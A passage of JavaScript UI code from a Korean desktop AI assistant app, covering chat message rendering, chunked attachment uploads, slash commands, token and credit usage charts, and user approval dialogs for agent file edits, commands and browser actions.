          feedbackButton(msg, 1), feedbackButton(msg, -1),
          h("button", { title: "부적절한 응답 신고", "aria-label": "부적절한 응답 신고", class: "report-btn", html: ICONS.flag,
            onclick: () => reportAiResponse({ content: msg.content, model: (msg.routing && msg.routing.model) || (S.thread && S.thread.model) || "" }) }),
        ),
      ),
    );
  }
  if (msg.role === "tool") {
    const summary = h("summary", { html: ICONS.chev }, h("span", { class: "t-sum" }, msg.content));
    const d = h("details", {}, summary);
    if (msg.detail) d.append(diffOrPre(msg.detail));
    // 1.16: 브라우저 에이전트의 화면 캡처처럼 도구가 남긴 파일
    const files = msg.attachments && msg.attachments.length ? attachmentList(msg.attachments) : null;
    return h("div", { class: "msg tool" }, d, files);
  }
  if (msg.role === "error") {
    return h("div", { class: "msg error" }, "⚠ " + msg.content);
  }
  return h("div");
}

/* ---------- 첨부 파일 ---------- */
const IMAGE_EXT = /\.(png|jpe?g|gif|webp)$/i;
const previewCache = new Map();

function fmtSize(n) {
  if (n < 1024) return n + " B";
  if (n < 1024 * 1024) return (n / 1024).toFixed(n < 10240 ? 1 : 0) + " KB";
  return (n / 1024 / 1024).toFixed(1) + " MB";
}

/* 보낸 메시지의 첨부 파일: 이미지는 미리보기, 나머지는 이름 칩. 누르면 알맞은 앱으로 연다. */
function attachmentList(items) {
  return h("div", { class: "msg-files" }, items.map((a) => {
    if (a.kind === "image") {
      const img = h("img", { alt: a.name });
      const node = h("button", { class: "file-img", title: a.name, onclick: () => openAttachment(a) }, img);
      const show = (url) => (url ? (img.src = url) : node.replaceWith(fileChip(a)));
      if (previewCache.has(a.id)) show(previewCache.get(a.id));
      else api().attachment_preview(a.id).then((url) => { previewCache.set(a.id, url); show(url); });
      return node;
    }
    return fileChip(a);
  }));
}

/* 이미지·문서는 기본 앱으로 연다. 텍스트 첨부는 실행되지 않도록 Python이 내용만 돌려주고 여기서 보여 준다. */
function openAttachment(a) {
  api().open_attachment(a.id).then((r) => {
    if (!r || typeof r.text !== "string") return;
    modal({ title: r.name || a.name, wide: true,
      body: h("pre", { class: "attach-text" }, r.text + (r.truncated ? "\n\n… (앞부분만 표시했습니다)" : "")) });
  });
}

function fileChip(a) {
  return h("button", { class: "file-chip", title: a.name, onclick: () => openAttachment(a) },
    h("span", { class: "f-icon", html: ICONS.file }),
    h("span", { class: "f-text" }, h("span", { class: "f-name" }, a.name), h("small", {}, fmtSize(a.size))));
}

function newAttachId() {
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
}

function readBase64(blob) {
  return new Promise((resolve, reject) => {
    const r = new FileReader();
    r.onload = () => resolve(String(r.result).slice(String(r.result).indexOf(",") + 1));
    r.onerror = () => reject(r.error);
    r.readAsDataURL(blob);
  });
}

/* 파일을 512KB 조각으로 나눠 Python으로 보낸다(큰 문자열 하나를 넘기면 브리지가 느려지거나 멈춘다). */
async function uploadAttachment(file, entry) {
  const CHUNK = 512 * 1024;
  let offset = 0;
  for (;;) {
    const blob = file.slice(offset, offset + CHUNK);
    const last = offset + blob.size >= file.size;
    const res = await api().upload_attachment(entry.id, file.name, offset, await readBase64(blob), last);
    if (!S.attach.includes(entry)) return;  // 올리는 중에 뺐다
    if (!res.ok) throw new Error(res.error);
    offset += blob.size;
    entry.progress = file.size ? offset / file.size : 1;
    renderTray();
    if (last) return res.attachment;
  }
}

function addFiles(fileList) {
  const files = Array.from(fileList || []);
  if (!files.length) return;
  const room = S.attachLimits.max_files - S.attach.length;
  if (files.length > room) toast(`파일은 한 번에 ${S.attachLimits.max_files}개까지 첨부할 수 있습니다`);
  for (const file of files.slice(0, Math.max(room, 0))) {
    if (file.size > S.attachLimits.max_bytes) {
      toast(`'${file.name}'이(가) 너무 큽니다 (${fmtSize(S.attachLimits.max_bytes)} 초과)`);
      continue;
    }
    const entry = {
      id: newAttachId(), name: file.name || "붙여넣은 이미지.png", size: file.size, status: "uploading", progress: 0,
      kind: IMAGE_EXT.test(file.name || ".png") ? "image" : "file",
    };
    if (entry.kind === "image") entry.url = URL.createObjectURL(file);
    S.attach.push(entry);
    uploadAttachment(file.name ? file : new File([file], entry.name, { type: file.type }), entry)
      .then((info) => {
        if (!info) return;
        entry.status = "ready";
        entry.kind = info.kind;
        entry.name = info.name;
      })
      .catch((e) => {
        entry.status = "error";
        entry.error = e.message || String(e);
        toast(entry.error);
      })
      .finally(() => { renderTray(); updateSend(); });
  }
  renderTray();
  updateSend();
}

function removeAttachment(entry) {
  S.attach = S.attach.filter((a) => a !== entry);
  if (entry.url) URL.revokeObjectURL(entry.url);
  api().discard_attachment(entry.id);
  renderTray();
  updateSend();
}

function clearTray() {
  for (const a of S.attach) if (a.url) URL.revokeObjectURL(a.url);
  S.attach = [];
  renderTray();
}

function renderTray() {
  const tray = $("#attach-tray");
  tray.hidden = !S.attach.length;
  tray.replaceChildren(...S.attach.map((a) => {
    const remove = h("button", { class: "t-remove", title: "빼기", html: ICONS.close, onclick: () => removeAttachment(a) });
    const label = a.status === "uploading" ? `올리는 중 ${Math.round(a.progress * 100)}%`
      : a.status === "error" ? "오류 — " + a.error : fmtSize(a.size);
    return h("div", { class: "tray-item " + a.status, title: a.status === "error" ? a.error : a.name },
      a.url ? h("img", { src: a.url, alt: "" }) : h("span", { class: "f-icon", html: ICONS.file }),
      h("span", { class: "f-text" }, h("span", { class: "f-name" }, a.name), h("small", {}, label)),
      remove);
  }));
}

function diffOrPre(text) {
  const isDiff = /^--- a\//.test(text);
  if (!isDiff) return h("pre", {}, text);
  const box = h("pre", { class: "diff" });
  for (const line of text.split("\n")) {
    let cls = "";
    if (line.startsWith("+") && !line.startsWith("+++")) cls = "add";
    else if (line.startsWith("-") && !line.startsWith("---")) cls = "del";
    else if (line.startsWith("@@")) cls = "hunk";
    box.append(h("div", { class: cls }, line || " "));
  }
  return box;
}

function typingNode() {
  return h("div", { class: "typing", id: "typing" },
    h("div", { class: "avatar" }, "P"),
    h("div", { class: "status" }, h("span", { class: "dots" }, h("i"), h("i"), h("i")), h("span", { id: "status-text" }, S.status || "생각하는 중...")),
  );
}

const SUGGESTIONS = [
  ["이 작업 폴더 구조 설명해줘", "어떤 파일이 있고 무슨 역할인지"],
  ["/init", "폴더를 분석해 INIT.md 만들기"],
  ["/summarize", "문서를 핵심 위주로 요약"],
  ["/remember", "모든 대화에서 기억할 내용 저장"],
  ["/user", "대화를 바탕으로 내 정보(USER.md) 정리"],
];

function renderMessages() {
  const box = $("#messages");
  box.innerHTML = "";
  const msgs = S.thread ? S.thread.messages : [];
  if (!msgs.length) {
    const sug = h("div", { class: "suggestions" },
      SUGGESTIONS.map(([title, sub]) => h("button", {
        class: "suggestion",
        onclick: () => {
          const input = $("#input");
          input.value = title.startsWith("/") ? title + " " : title;
          autoresize();
          updateSend();
          input.focus();
        },
      }, h("b", {}, title), h("span", {}, sub))));
    const sub = S.workspace.path
      ? `작업 폴더: ${S.workspace.name}` + (S.config.agent_mode ? " · 에이전트 모드 켜짐" : "")
      : "왼쪽 아래에서 작업 폴더를 고르면 파일을 읽고 고치는 에이전트로 일합니다";
    box.append(h("div", { class: "empty" }, h("h1", {}, "무엇을 도와드릴까요?"), h("p", {}, sub), sug));
  } else {
    for (const m of msgs) box.append(messageNode(m));
  }
  if (S.busy && S.busyThread === S.currentId) box.append(typingNode());
  scrollToBottom(true);
}

function appendMessage(msg) {
  const box = $("#messages");
  if (box.querySelector(".empty")) box.innerHTML = "";
  const typing = $("#typing");
  const node = messageNode(msg);
  if (typing) box.insertBefore(node, typing);
  else box.append(node);
  scrollToBottom();
}

/* 스트리밍 중인 답변: 받은 텍스트를 화면 갱신 주기에 맞춰 다시 그린다. 최종 답변이 오면 일반 메시지로 바뀐다. */
const streaming = { text: "", frame: 0 };

function showStreaming(text) {
  streaming.text = text;
  if (streaming.frame) return;
  streaming.frame = requestAnimationFrame(() => {
    streaming.frame = 0;
    let node = $("#streaming");
    if (!node) {
      node = h("div", { class: "msg assistant streaming", id: "streaming" }, h("div", { class: "avatar" }, "P"), h("div", { class: "body" }));
      const typing = $("#typing");
      if (typing) {
        typing.hidden = true;
        $("#messages").insertBefore(node, typing);
      } else {
        $("#messages").append(node);
      }
    }
    const live = window.streamingRouteNode ? streamingRouteNode() : null;  // 1.17: 로컬 '검증 전'·Cloud로 다시 답하는 중
    node.querySelector(".body").replaceChildren(...(live ? [live] : []), renderMarkdown(streaming.text));
    scrollToBottom();
  });
}

function endStreaming() {
  if (streaming.frame) cancelAnimationFrame(streaming.frame);
  streaming.frame = 0;
  streaming.text = "";
  $("#streaming")?.remove();
  const typing = $("#typing");
  if (typing) typing.hidden = false;
}

function scrollToBottom(force) {
  const sc = $("#scroll");
  const near = sc.scrollHeight - sc.scrollTop - sc.clientHeight < 200;
  if (force || near) requestAnimationFrame(() => (sc.scrollTop = sc.scrollHeight));
}

/* ---------- 입력창 ---------- */
function autoresize() {
  const input = $("#input");
  input.style.height = "auto";
  input.style.height = Math.min(input.scrollHeight, 220) + "px";
}

function updateSend() {
  const btn = $("#btn-send");
  if (S.busy) {
    btn.innerHTML = ICONS.stop;
    btn.title = "중지";
    btn.disabled = false;
  } else {
    btn.innerHTML = ICONS.up;
    const uploading = S.attach.some((a) => a.status === "uploading");
    btn.title = uploading ? "파일을 올리는 중입니다" : "보내기";
    btn.disabled = uploading || !($("#input").value.trim() || S.attach.some((a) => a.status === "ready"));
  }
}

function renderWorkspaceChip() {
  const chip = $("#ws-chip");
  const ws = S.workspace;
  const agent = $("#agent-toggle").checked;
  let label;
  if (!ws.path) label = "작업 폴더 선택";
  else label = ws.name + (agent ? "" : " (일반 대화)");
  chip.innerHTML = ICONS.folder;
  chip.append(h("span", {}, label));
  chip.title = ws.path ? `${ws.path}\n클릭해서 바꾸기` : "작업 폴더를 고르면 에이전트가 파일을 다룰 수 있습니다";
}

async function send() {
  if (S.busy) {
    await api().stop(S.currentId);
    toast("이 대화를 멈추는 중입니다");
    return;
  }
  const input = $("#input");
  const text = input.value.trim();
  const ready = S.attach.filter((a) => a.status === "ready");
  if (S.attach.some((a) => a.status === "uploading")) return toast("파일을 올리는 중입니다");
  if (!text && !ready.length) return;
  if (/^\/help\b/i.test(text)) {
    input.value = "";
    autoresize();
    updateSend();
    return showHelp();
  }
  if (/^\/memory\b/i.test(text)) {
    input.value = "";
    autoresize();
    updateSend();
    return showMemory();
  }
  if (/^\/usage\s*$/i.test(text)) {
    input.value = "";
    autoresize();
    updateSend();
    return showUsage();
  }
  const remember = text.match(/^\/remember\s+([\s\S]+)/i);
  if (remember) {
    const res = await api().add_memory(remember[1]);
    S.memory = res.memory;
    input.value = "";
    autoresize();
    updateSend();
    return toast(res.ok ? "기억했습니다. 모든 대화에서 참고합니다" : "이미 기억하고 있는 내용입니다");
  }
  hideSlash();
  const sentId = S.currentId;
  const res = await api().send(sentId, text, $("#agent-toggle").checked, ready.map((a) => a.id));
  if (!res.ok) {
    toast(res.error);
    if (res.need_key) showSettings();
    return;
  }
  for (const a of ready) if (a.url && a.kind === "image") previewCache.delete(a.id);
  S.attach = S.attach.filter((a) => !ready.includes(a));  // 오류 난 파일은 남겨 두어 사용자가 보고 뺀다
  renderTray();
  input.value = "";
  autoresize();
  const runtime = await api().get_state();
  S.runningThreads = new Set(runtime.running_threads || []);
  if (S.currentId !== sentId) { updateSend(); refreshThreads(); return; }
  S.thread.messages.push(res.message);
  S.thread.title = res.title;
  $("#chat-title").textContent = res.title;
  S.busy = S.runningThreads.has(sentId);
  S.busyThread = S.busy ? sentId : null;
  S.status = "생각하는 중...";
  appendMessage(res.message);
  await openThread(sentId, false);
  scrollToBottom(true);
  updateSend();
  refreshThreads();
}

/* 슬래시 명령 메뉴 */
function slashItems(query) {
  const base = [
    { name: "init", description: "작업 폴더를 분석해 INIT.md 만들기" },
    { name: "user", description: "지금까지의 대화로 내 정보(USER.md) 작성·업데이트" },
    { name: "remember", description: "모든 대화에서 기억할 내용 저장 (/remember 내용)" },
    { name: "memory", description: "기억 목록 보기·지우기" },
    { name: "usage", description: "사용량(AI 호출·토큰·크레딧) 보기" },
    { name: "help", description: "도움말" },
    ...S.skills.map((s) => ({ name: s.name, description: s.description_ko || s.description })),  // 1.19.1 플러그인 스킬은 한국어
  ];
  const q = query.toLowerCase();
  return base.filter((it) => it.name.toLowerCase().startsWith(q) || (q && it.name.toLowerCase().includes(q)));
}

function updateSlash() {
  const value = $("#input").value;
  const m = value.match(/^\/(\S*)$/);
  if (!m) return hideSlash();
  const items = slashItems(m[1]);
  if (!items.length) return hideSlash();
  S.slash.items = items;
  S.slash.index = Math.min(S.slash.index, items.length - 1);
  const menu = $("#slash-menu");
  menu.innerHTML = "";
  items.forEach((it, i) => {
    menu.append(h("div", {
      class: "slash-item" + (i === S.slash.index ? " sel" : ""),
      onmousedown: (e) => { e.preventDefault(); pickSlash(i); },
    }, h("b", {}, "/" + it.name), h("span", {}, it.description)));
  });
  menu.hidden = false;
}

function hideSlash() {
  $("#slash-menu").hidden = true;
  S.slash.items = [];
  S.slash.index = 0;
}

function pickSlash(i) {
  const it = S.slash.items[i];
  if (!it) return;
  const input = $("#input");
  input.value = "/" + it.name + " ";
  hideSlash();
  updateSend();
  input.focus();
}

/* ---------- 백엔드 이벤트 ---------- */
window.onBackendEvent = (ev) => {
  if (ev.type === "message") {
    if (ev.message.role === "assistant" || ev.message.role === "error") S.chatStreams.delete(ev.thread_id);
    if (ev.thread_id === S.currentId && S.thread) {
      if (ev.message.role === "assistant") endStreaming();
      S.thread.messages.push(ev.message);
      appendMessage(ev.message);
    }
  } else if (ev.type === "delta") {
    S.chatStreams.set(ev.thread_id, ev.text);
    if (ev.thread_id === S.currentId && S.thread) showStreaming(ev.text);
  } else if (ev.type === "status") {
    S.chatStatus.set(ev.thread_id, ev.text);
    if (ev.thread_id === S.currentId) S.status = ev.text;
    const st = $("#status-text");
    if (st && ev.thread_id === S.currentId) st.textContent = ev.text;
  } else if (ev.type === "confirm") {
    showConfirm(ev);
  } else if (ev.type === "po") {
    if (window.poEvent) poEvent(ev);
  } else if (ev.type === "update") {
    updateEvent(ev);
  } else if (ev.type === "credit") {
    S.credit = ev.credit;
    renderCredit();
  } else if (ev.type === "plms") {
    toast(ev.message);
  } else if (ev.type === "browser") {
    if (window.browserEvent) browserEvent(ev);
  } else if (ev.type === "code") {
    if (window.codeEvent) codeEvent(ev);
    if (window.labCodeEvent) labCodeEvent(ev);
  } else if (ev.type === "lab") {
    if (window.labEvent) labEvent(ev);
  } else if (ev.type === "connector" || ev.type === "hub") {
    if (window.hubEvent) hubEvent(ev);
  } else if (ev.type === "route") {
    if (window.routeEvent) routeEvent(ev);
  } else if (ev.type === "adaptive") {
    if (window.adaptiveEvent) adaptiveEvent(ev);
  } else if (ev.type === "done") {
    S.confirmQueue = S.confirmQueue.filter((c) => c.thread_id !== ev.thread_id);
    if (S.confirmActive && S.confirmActive.thread_id === ev.thread_id) S.confirmActive.modal.close();
    S.runningThreads.delete(ev.thread_id);
    S.chatStreams.delete(ev.thread_id);
    S.chatStatus.delete(ev.thread_id);
    S.busy = S.runningThreads.has(S.currentId);
    S.busyThread = S.busy ? S.currentId : null;
    if (ev.thread_id === S.currentId) {
      if (window.adaptiveDone) adaptiveDone();
      endStreaming();
      $("#typing")?.remove();
    }
    if (ev.workspace) S.workspace = ev.workspace;
    updateSend();
    refreshThreads();
  }
};

/* ---------- 크레딧 ---------- */
// POSTECH GenAI는 응답 헤더로 이번 주기(WEEKLY 등)의 크레딧 사용량과 한도를 알려 준다.
const INTERVALS = { WEEKLY: "이번 주", DAILY: "오늘", MONTHLY: "이번 달" };

function creditText(c) {
  if (!c || c.usage == null) return "아직 확인하지 않았습니다";
  const used = Math.round(c.usage).toLocaleString();
  const when = INTERVALS[(c.interval || "").toUpperCase()] || "현재 주기";
  if (!c.limit) return `${when} ${used} 크레딧 사용`;
  const left = Math.max(0, Math.round(c.limit - c.usage)).toLocaleString();
  return `${when} ${used} / ${Math.round(c.limit).toLocaleString()} 크레딧 사용 · 남은 ${left} (${Math.round(c.usage / c.limit * 100)}%)`;
}

/* 1.19.1 크레딧 막대: 이번 주기 한도 대비 사용량. 70%부터 주의(노랑), 90%부터 경고(빨강) 색 */
function creditBar() {
  const fill = h("span", { class: "credit-fill" });
  const bar = h("div", { class: "credit-bar", "data-credit-bar": "", role: "meter", "aria-label": "크레딧 사용량",
    "aria-valuemin": "0", "aria-valuemax": "100" }, fill);
  paintCreditBar(bar, S.credit);
  return bar;
}

function paintCreditBar(bar, c) {
  const known = !!(c && c.usage != null && c.limit);
  bar.hidden = !known;
  if (!known) return;
  const pct = Math.max(0, Math.min(100, c.usage / c.limit * 100));
  const fill = bar.firstChild;
  fill.style.width = `${pct}%`;
  bar.classList.toggle("warn", pct >= 70 && pct < 90);
  bar.classList.toggle("danger", pct >= 90);
  bar.setAttribute("aria-valuenow", String(Math.round(pct)));
  bar.setAttribute("aria-valuetext", creditText(c));
  bar.title = creditText(c);
}

function renderCredit() {
  document.querySelectorAll("[data-credit]").forEach((el) => { el.textContent = creditText(S.credit); });
  document.querySelectorAll("[data-credit-bar]").forEach((el) => paintCreditBar(el, S.credit));
}

/* 이 앱이 보낸 AI 호출 수·토큰(storage.usage_summary). 설정 창과 /usage(채팅·Code 작업 탭)가 함께 쓴다 */
function usageText(u) {
  const fmt = (n) => n >= 10000 ? (n / 10000).toFixed(n >= 100000 ? 0 : 1) + "만" : n.toLocaleString();
  return `${u.calls.toLocaleString()}회` + (u.token_calls
    ? ` · 토큰 입력 ${fmt(u.input_tokens)} / 출력 ${fmt(u.output_tokens)}` + (u.token_calls < u.calls ? ` (${u.token_calls}회분)` : "")
    : "");
}

function usageRows(u) {
  return [["오늘", u.today], [`이번 달 (${u.month_name})`, u.month], ["최근 30일", u.last30]];
}

function usageView() {
  const box = h("div", {}, h("small", {}, "불러오는 중..."));
  api().get_usage().then((u) => {
    box.replaceChildren(usageChart(u.daily),
      ...usageRows(u).map(([label, v]) => h("div", { class: "row", style: "justify-content:space-between;font-size:13px;margin:2px 0" },
        h("span", {}, label), h("span", {}, usageText(v)))));
  }).catch(() => box.replaceChildren(h("small", {}, "사용량을 불러오지 못했습니다.")));
  return box;
}

/* 1.19 최근 30일 토큰 그래프: 날짜별 막대(아래 입력, 위 출력). 막대에 마우스를 올리면 그날의 수치가 보인다. */
const SVG_NS = "http://www.w3.org/2000/svg";
function svg(tag, attrs = {}, ...children) {
  const node = document.createElementNS(SVG_NS, tag);
  for (const [k, v] of Object.entries(attrs)) if (v != null) node.setAttribute(k, v);
  for (const c of children.flat()) if (c != null) node.append(c instanceof Node ? c : document.createTextNode(String(c)));
  return node;
}
function compactNum(n) {
  if (n >= 1e6) return `${(n / 1e6).toFixed(n >= 1e7 ? 0 : 1)}M`;
  if (n >= 1e3) return `${(n / 1e3).toFixed(n >= 1e4 ? 0 : 1)}K`;
  return String(n);
}
function usageChart(daily) {
  daily = Array.isArray(daily) ? daily : [];
  if (!daily.length) return null;
  const totals = daily.map((d) => (d.input_tokens || 0) + (d.output_tokens || 0));
  const max = Math.max(...totals);
  const sum = totals.reduce((a, b) => a + b, 0);
  const W = 600, H = 150, left = 40, bottom = 20, top = 8, plotH = H - top - bottom, plotW = W - left - 4;
  const step = plotW / daily.length, bar = Math.max(3, step * 0.62);
  // 눈금: 0, 절반, 최댓값을 보기 좋은 수로 올린 값
  const nice = (() => {
    if (!max) return 1;
    const p = 10 ** Math.floor(Math.log10(max));
    return [1, 2, 2.5, 5, 10].map((m) => m * p).find((v) => v >= max);
  })();
  const y = (v) => top + plotH - (v / nice) * plotH;
  const grid = [0, nice / 2, nice].map((v) => [
    svg("line", { x1: left, x2: W - 4, y1: y(v), y2: y(v), class: "uc-grid" }),
    svg("text", { x: left - 6, y: y(v) + 4, class: "uc-axis", "text-anchor": "end" }, compactNum(v))]);
  const bars = daily.map((d, i) => {
    const x = left + i * step + (step - bar) / 2;
    const inH = (d.input_tokens / nice) * plotH, outH = (d.output_tokens / nice) * plotH;
    const label = `${d.day} · 호출 ${num(d.calls)}회 · 입력 ${num(d.input_tokens)} · 출력 ${num(d.output_tokens)} 토큰`;
    return svg("g", { class: "uc-day" },
      svg("title", {}, label),
      svg("rect", { x: left + i * step, y: top, width: step, height: plotH, class: "uc-hit" }),
      inH ? svg("rect", { x, y: top + plotH - inH, width: bar, height: inH, rx: 1.5, class: "uc-in" }) : null,
      outH ? svg("rect", { x, y: top + plotH - inH - outH, width: bar, height: outH, rx: 1.5, class: "uc-out" }) : null);
  });
  const ticks = daily.map((d, i) => (i % 7 === 0 || i === daily.length - 1)
    ? svg("text", { x: left + i * step + step / 2, y: H - 5, class: "uc-axis", "text-anchor": "middle" }, d.day.slice(5).replace("-", "/")) : null);
  const chart = svg("svg", { viewBox: `0 0 ${W} ${H}`, class: "usage-chart-svg", role: "img",
    "aria-label": `최근 30일 토큰 사용량 그래프. 합계 ${num(sum)} 토큰, 가장 많은 날 ${num(max)} 토큰` }, grid, bars, ticks);
  return h("figure", { class: "usage-chart" },
    h("figcaption", {},
      h("b", {}, "최근 30일 토큰"), h("span", { class: "muted" }, ` 합계 ${num(sum)}`),
      h("span", { class: "uc-legend" },
        h("span", { class: "uc-key uc-in-key" }), "입력", h("span", { class: "uc-key uc-out-key" }), "출력")),
    chart,
    sum ? null : h("small", { class: "muted" }, "아직 기록된 토큰이 없습니다. 서버가 사용량을 알려 준 요청만 셉니다."));
}

/* /usage: 사용량 창(1.18.1) */
function showUsage() {
  const body = h("div", {},
    h("h3", { style: "margin:0 0 6px;font-size:15px" }, "AI 호출"), usageView(),
    h("p", { class: "muted", style: "font-size:12.5px;margin:6px 0 0" },
      "이 기기에서 이 앱이 보낸 호출을 셉니다(채팅·에이전트·Code 포함). 토큰 수는 서버가 알려 줄 때만 더합니다."),
    S.config.key_source ? h("div", {}, h("h3", { style: "margin:16px 0 6px;font-size:15px" }, "POSTECH GenAI 크레딧"), creditLine()) : null);
  modal({ title: "사용량", body, buttons: [{ label: "닫기", class: "primary" }] });
}

/* 크레딧 표시 줄. 처음 그릴 때와 '확인'을 누를 때 크레딧을 쓰지 않는 요청으로 새로 받는다. */
function creditLine(auto = true) {
  const text = h("span", { "data-credit": "", style: "flex:1" }, creditText(S.credit));
  const refresh = async () => {
    btn.disabled = true;
    try {
      const res = await api().get_credit();
      if (res.ok === false) text.textContent = res.error;
      else {
        S.credit = res;
        renderCredit();
      }
    } finally {
      btn.disabled = false;
    }
  };
  const btn = h("button", { class: "btn", type: "button", onclick: refresh }, "확인");
  // 화면을 다시 그릴 때마다 묻지 않도록 1분에 한 번만 저절로 확인한다
  if (auto && S.config.key_source && Date.now() - (S.creditAt || 0) > 60000) {
    S.creditAt = Date.now();
    setTimeout(refresh, 0);
  }
  return h("div", { class: "credit-box" }, h("div", { class: "row credit-line" }, text, btn), creditBar());
}

/* ---------- 모달 ---------- */
function modal({ title, body, buttons = [], wide = false, onClose }) {
  if (isNarrow()) setCollapsed(true);  // 휴대폰: 사이드바 서랍에서 연 창이면 서랍을 닫는다
  const root = $("#modal-root");
  const opener = document.activeElement;  // 닫으면 창을 연 버튼으로 초점을 돌려준다(키보드·화면 낭독기)
  const close = (value) => {
    backdrop.remove();
    document.removeEventListener("keydown", onKey);
    onClose && onClose(value);
    if (opener && opener.isConnected && typeof opener.focus === "function" && !$("#modal-root .modal")) opener.focus();
  };
  const onKey = (e) => { if (e.key === "Escape") close(null); };
  const foot = h("div", { class: "modal-foot" },
    buttons.map((b) => h("button", { class: "btn " + (b.class || ""), onclick: () => (b.action ? b.action(close) : close(b.value)) }, b.label)));
  const titleId = `modal-title-${++modal.count}`;
  const box = h("div", { class: "modal" + (wide ? " wide" : ""), role: "dialog", "aria-modal": "true", "aria-labelledby": titleId },
    h("div", { class: "modal-head" }, h("h2", { id: titleId }, title),
      h("button", { class: "icon-btn", html: ICONS.close, title: "닫기", "aria-label": "닫기", onclick: () => close(null) })),
    h("div", { class: "modal-body" }, body),
    buttons.length ? foot : null,
  );
  const backdrop = h("div", { class: "modal-backdrop" }, box);
  backdrop.addEventListener("mousedown", (e) => { if (e.target === backdrop) close(null); });
  document.addEventListener("keydown", onKey);
  root.append(backdrop);
  // 창 안의 첫 입력 칸(없으면 창 자체)에 초점을 둔다. 따로 초점을 옮기는 창(설정 등)은 그 뒤에 옮긴다.
  const first = [...box.querySelectorAll(".modal-body input:not([type=hidden]):not([disabled]), .modal-body select, .modal-body textarea")]
    .find((el) => el.getClientRects().length);  // 접어 둔 칸(예: PLMS 계정 저장)은 건너뛴다
  box.tabIndex = -1;
  ((!isNarrow() && first) || box).focus({ preventScroll: true });  // 휴대폰에서는 키보드가 뜨지 않게 창에만
  return { close, box };
}
modal.count = 0;

// 승인 종류별 안내. send·destructive·exec·site는 설정과 관계없이 매번 묻고 "모두 허용"을 보이지 않는다.
const CONFIRM_TEXT = {
  edit: ["에이전트가 다음과 같이 파일을 바꾸려고 합니다.", "이번 실행 동안 수정 모두 허용"],
  run: ["에이전트가 작업 폴더에서 다음 명령(또는 외부 도구)을 실행하려고 합니다.", "이번 실행 동안 명령 모두 허용"],
  write: ["에이전트가 연결된 외부 서비스에 다음 내용을 쓰려고 합니다.", "이번 실행 동안 쓰기 모두 허용"],
  send: ["에이전트가 다른 사람에게 보이는 작업(전송·리뷰 제출)을 하려고 합니다. 받는 사람과 내용을 확인하세요.", ""],
  destructive: ["에이전트가 지우거나 덮어쓰는 작업을 하려고 합니다. 되돌릴 수 없을 수 있습니다.", ""],
  exec: ["에이전트가 코드 또는 원격 명령을 실행하려고 합니다. 실행 대상과 내용을 확인하세요.", ""],
  browser: ["에이전트가 옆 브라우저에서 다음 동작을 하려고 합니다. 주소와 대상을 확인하세요.", "이번 실행 동안 이런 브라우저 동작 허용"],
  site: ["에이전트가 이 주소를 열거나(옆 브라우저·웹 읽기) 이 사이트를 조작하려고 합니다. 주소 전체를 확인하세요.", ""],
};

function showConfirm(ev) {
  // 1.17.2: Code 에이전트의 승인은 '작업' 탭이 보이면 터미널 안의 선택지로 묻는다(CLI처럼). 안 보이면 이 창으로
  if (ev.source === "code_agent" && window.caConfirm && caConfirm(ev)) return;
  if (S.confirmActive) { S.confirmQueue.push(ev); return; }
  S.confirmActive = ev;
  const isRun = ev.kind !== "edit";
  const [intro, alwaysLabel] = CONFIRM_TEXT[ev.kind] || CONFIRM_TEXT.run;
  const body = h("div", {},
    h("p", { style: "margin:0 0 10px;color:var(--text-2)" }, intro),
    isRun ? h("pre", { class: "diff" }, h("div", {}, ev.detail)) : diffOrPre(ev.detail),
  );
  let answered = false;
  const answer = (decision) => (close) => {
    answered = true;
    api().resolve_confirm(ev.id, decision);
    close(decision);
  };
  ev.modal = modal({
    title: `${(S.threads.find((t) => t.id === ev.thread_id) || {}).title || ev.session_title || "작업"} · ${ev.title}`,
    body,
    wide: true,
    buttons: [
      { label: "거부", class: "danger", action: answer("deny") },
      ...(ev.allow_session !== false && alwaysLabel ? [{ label: alwaysLabel, action: answer("always") }] : []),
      // 1.17.1 Code 에이전트: 이 명령(접두어)은 이 작업 폴더에서 다시 묻지 않기
      ...(ev.remember ? [{ label: `허용 · '${ev.remember}' 다시 묻지 않기`, action: answer("remember") }] : []),
      { label: "허용", class: "primary", action: answer("allow") },
    ],
    onClose: () => {
      if (!answered) api().resolve_confirm(ev.id, "deny");
      S.confirmActive = null;
      const next = S.confirmQueue.shift();
      if (next) showConfirm(next);
    },
  });
}

function showSettings() {
  const c = S.config;
  const keyHint = c.key_source === "settings" ? "저장된 키가 있습니다. 바꾸려면 새 키를 입력하세요."
    : c.key_source === "env" ? "환경 변수 POSTECH_GENAI_API_KEY의 키를 쓰고 있습니다."
    : "API 키가 없습니다.";
  const key = h("input", { type: "password", placeholder: c.key_source ? "••••••••••••" : "API 키 입력", autocomplete: "off" });
  const notionHint = c.notion_source === "settings" ? "저장된 토큰이 있습니다. 바꾸려면 새 토큰을 입력하세요."
    : c.notion_source === "env" ? "환경 변수 NOTION_TOKEN의 토큰을 쓰고 있습니다."
    : "notion MCP 서버를 쓸 때만 필요합니다.";
  const notion = h("input", { type: "password", placeholder: c.notion_source ? "••••••••••••" : "ntn_... (선택)", autocomplete: "off" });
  const clearNotion = h("input", { type: "checkbox", style: "width:auto;margin:0 6px 0 0" });
  const fcHint = c.firecrawl_source === "settings" ? "저장된 키가 있습니다. 바꾸려면 새 키를 입력하세요."
    : c.firecrawl_source === "env" ? "환경 변수 FIRECRAWL_API_KEY의 키를 쓰고 있습니다."
    : "firecrawl MCP 서버를 쓸 때만 필요합니다.";
  const firecrawl = h("input", { type: "password", placeholder: c.firecrawl_source ? "••••••••••••" : "fc-... (선택)", autocomplete: "off" });
  const clearFirecrawl = h("input", { type: "checkbox", style: "width:auto;margin:0 6px 0 0" });
  const plmsUser = h("input", { type: "text", value: c.plms_username || "", placeholder: "POSTECH 아이디 (선택)", autocomplete: "off", spellcheck: false });
  const plmsPass = h("input", { type: "password", placeholder: c.plms_username ? "••••••••••••" : "비밀번호 (선택)", autocomplete: "new-password" });
  const clearPlms = h("input", { type: "checkbox", style: "width:auto;margin:0 6px 0 0" });
  const usageBox = usageView();
  const hist = h("input", { type: "number", min: 0, max: 200, value: c.history_messages });
  const steps = h("input", { type: "number", min: 1, max: 100, value: c.max_steps });
  const perm = h("select", {},
    h("option", { value: "ask" }, "매번 묻기 (권장)"),
    h("option", { value: "auto_edit" }, "파일 수정은 자동 허용, 명령은 묻기"),
    h("option", { value: "auto_all" }, "모두 자동 허용 (주의)"),
  );
  perm.value = c.permission || "ask";
